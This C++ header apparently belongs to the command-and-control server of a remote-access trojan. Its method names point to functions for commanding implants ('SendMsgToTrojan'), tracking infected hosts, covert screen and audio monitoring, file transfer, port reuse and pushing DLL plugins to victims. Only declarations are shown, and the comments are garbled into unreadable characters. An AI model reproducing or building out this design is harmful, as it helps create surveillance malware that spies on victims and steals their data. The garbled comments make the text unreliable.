#if !defined(AFX_MASTERSERVICE_H__9A868FBA_F91C_4EAD_892A_AA7AC94281EA__INCLUDED_)
#define AFX_MASTERSERVICE_H__9A868FBA_F91C_4EAD_892A_AA7AC94281EA__INCLUDED_

#include <vector>
#include <map>
#include "iPlug.h"

typedef void* conn;

class MasterService : public IService
{
public:
	MasterService();
	virtual ~MasterService();

	virtual BOOL OnInitalize();
	virtual BOOL OnUninitalize();	
	virtual BOOL OnService(UINT, WPARAM, LPARAM);
	
	//�ͻ��˼����̣߳�ÿ����һ���µ����ӣ�����һ���µ��߳�DispatchThread
	static unsigned int WINAPI ListenThread(void* param);
	
	//����ַ��߳�
	static unsigned int WINAPI DispatchThread(void* param);

	//�ļ��ϴ��߳�
	static unsigned int WINAPI FileUpDownThread(void* param);

	//�˿ڸ����߳�
	static unsigned int WINAPI PortReuseThread(void* param);

	//��Ļ����߳�
	static unsigned int WINAPI MonitorScreenThread(void* param);

	//��Ļ����߳�
	static unsigned int WINAPI MonitorAudioThread(void* param);

	//����ָ�����ݸ�ľ��Ŀ���
	int SendMsgToTrojan(WPARAM wp);

	//�Դ�ľ��˽��ܵ����ݽ��д���
	int ProcessRecvData(WPARAM wp, LPARAM lp);

	//��ĳ�������˿�
	int OpenListenPort(int type, unsigned short port, bool update = false);

private:
	//����ľ��״̬
	void UpdateTrojanStatus(DispatchData* da, bool online);
	
	void RecordDllInfo(char* guid, int dataLen, char* data);
	
	//���������ļ���Ϣ
	void UpdateProfile();

	//�ϴ����
	int UpdateOneDll(const char* path, const char* fileName);
	void UpdatePlugins();

private:
	char					iniFileName[MAX_PATH];
	BOOL					m_bExit;					
	std::vector<HANDLE>		m_vDispatchHandles;
	std::vector<conn>		m_allConns;
	std::map<int, HANDLE>	m_allListenThreads;
	std::map<int, unsigned int> m_allListenThreadIds;
	std::map<void*, struct TrojanInfo> m_allInfos;
};

#endif